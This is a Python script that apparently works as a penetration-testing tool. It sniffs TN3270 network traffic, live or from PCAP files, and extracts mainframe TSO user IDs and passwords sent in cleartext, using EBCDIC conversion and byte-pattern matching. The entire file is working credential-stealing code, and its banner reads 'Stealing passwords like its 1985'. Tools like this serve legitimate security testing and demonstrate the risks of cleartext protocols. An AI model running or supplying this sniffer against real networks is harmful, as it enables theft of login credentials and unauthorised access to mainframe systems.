#!/usr/bin/env python


##################################################################
# Script to capture TSO login credentials			 #
#                                                                #
# Requirements: Python, scapy and IP/Port of mainframe           #
# Created by: Soldier of Fortran (@mainframed767)                #
# Usage: Given an interface, IP and port this script will 	 #
# try to sniff mainframe user IDs and  passwords sent over       #
# cleartext using TN3270 (tested against x3270 and TN3270X)      #
#                                                                #
# Copyright GPL 2012                                             #
##################################################################

from scapy.all import * #needed for scapy
import argparse #needed for argument parsing
import re

def welcome():
    print '''
          ____________________________
        /|............................|
       | |:         Mainframe        :|
       | |:     Password Sniffer     :|
       | |:     ,-.   _____   ,-.    :|
       | |:    ( `)) [_____] ( `))   :|
       |v|:     `-`   ' ' '   `-`    :|
       |||:     ,______________.     :|
       |||...../::::o::::::o::::\.....|
       |^|..../:::O::::::::::O:::\....|
       |/`---/--------------------`---|
       `.___/ /====/ /=//=/ /====/____/
            `--------------------'
       Stealing passwords like its 1985
'''

#EBCDIC converter to ignore non-ascii chars
# from http://www.pha.com.au/kb/index.php/Ebcdic.py
e2a = [
      0,  1,  2,  3,156,  9,134,127,151,141,142, 11, 12, 13, 14, 15,
     16, 17, 18, 19,157,133,  8,135, 24, 25,146,143, 28, 29, 30, 31,
    128,129,130,131,132, 10, 23, 27,136,137,138,139,140,  5,  6,  7,
    144,145, 22,147,148,149,150,  4,152,153,154,155, 20, 21,158, 26,
     32,160,161,162,163,164,165,166,167,168, 91, 46, 60, 40, 43, 33,
     38,169,170,171,172,173,174,175,176,177, 93, 36, 42, 41, 59, 94,
     45, 47,178,179,180,181,182,183,184,185,124, 44, 37, 95, 62, 63,
    186,187,188,189,190,191,192,193,194, 96, 58, 35, 64, 39, 61, 34,
    195, 97, 98, 99,100,101,102,103,104,105,196,197,198,199,200,201,
    202,106,107,108,109,110,111,112,113,114,203,204,205,206,207,208,
    209,126,115,116,117,118,119,120,121,122,210,211,212,213,214,215,
    216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,
    123, 65, 66, 67, 68, 69, 70, 71, 72, 73,232,233,234,235,236,237,
    125, 74, 75, 76, 77, 78, 79, 80, 81, 82,238,239,240,241,242,243,
     92,159, 83, 84, 85, 86, 87, 88, 89, 90,244,245,246,247,248,249,
     48, 49, 50, 51, 52, 53, 54, 55, 56, 57,250,251,252,253,254,255
]

def EbcdicToAscii(s):
    return ''.join([ chr(e2a[ord(c)]) for c in s ])

# username (125 193 215 17 64 90) OR password (125 201 xxx 17 201 195)
magic = re.compile('}(\xc1\xd7\x11@Z|\xc9.\x11\xc9\xc3)', re.DOTALL)

def sniffTSO(pkt):
	if Raw not in pkt:
            return
	raw=pkt[Raw].load
	if raw.__len__() < 200:
		# If the destination and port match and the length of data is less than 200 chars
		# convert the raw string to an ebcdic string so we can search, etc
		sniffed = EbcdicToAscii(raw[1:-1])
		#print "[+] Length is", raw.__len__()
		#print sniffed
		#print "[+] Ordinals: ",
                m = magic.search(raw)
                if m is None:
                    return
                if m.group()[1] == '\xc1':
                    field = 'UserID'
                else:
                    field = 'Password'
                print "-{X}- Mainframe %s: %s" % (field, sniffed[m.end()-1:-1])
	#print ""

if __name__ == '__main__':
    welcome()
    #start argument parser
    parser = argparse.ArgumentParser(description='MF Sniffer - A script to capture TSO user ID and password',
                                     epilog='PRESS PLAY ON TAPE')
    parser.add_argument('-a', '--ip', help='Mainframe TN3270 server IP address')
    parser.add_argument('-p', '--port', help='Mainframe TN3270 server listening port (e.g 23, 2323, 623, etc)', type=int)
    parser.add_argument('-i', '--interface', help='network interface to listen on')
    parser.add_argument('-r', '--pcapfile', help='PCAP file to read')
    args = parser.parse_args()
    
    if args.pcapfile is not None:
        print "-{X}- Reading file:", args.pcapfile
        for p in PcapReader(args.pcapfile):
            sniffTSO(p)
        exit(0)
    
    print "-{X}- Mainframe:", args.ip is not None and args.ip or '*', ':', args.port is not None and args.port or '*'
    if args.interface is not None:
        print "-{X}- Sniffer started on interface:", args.interface
    
    flt = 'tcp'
    if args.ip is not None:
        flt += ' and dst host %s' % args.ip
    if args.port is not None:
        flt += ' and dst port %d' % args.port
    
    # Start scapy sniffer on interface and
    # pass all packets to the function sniffTSO
    sniff(iface=args.interface, prn=sniffTSO,
          filter=flt,
          store=False)
